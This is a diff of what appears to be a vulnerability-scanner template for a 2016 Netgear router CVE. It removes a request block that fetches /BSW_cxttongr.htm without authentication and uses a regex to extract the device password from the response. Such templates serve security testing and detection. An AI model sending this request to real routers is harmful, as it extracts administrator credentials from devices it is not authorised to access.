@@ -18,40 +18,5 @@ info:
         verified: false
         shodanquery: ""
     tags: cve,cve2016,iot,netgear,router,packetstorm
-requests:
-    - raw:
-        - |
-          GET /BSW_cxttongr.htm HTTP/1.1
-          Host: {{Hostname}}
-          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-      cookiereuse: false
-      method: ""
-      path: []
-      redirects: false
-      maxredirects: 0
-      stopatfirstmatch: false
-      matcherscondition: and
-      matchers:
-        - type: status
-          part: ""
-          words: []
-          dsl: []
-          regex: []
-          condition: ""
-          status:
-            - 200
-        - type: word
-          part: body
-          words:
-            - '<title>Smart Wizard Result</title> '
-          dsl: []
-          regex: []
-          condition: ""
-          status: []
-      extractors:
-        - type: regex
-          name: password
-          group: 1
-          regex:
-            - <b>Success "([a-z]+)"
+requests: []
 workflows: []
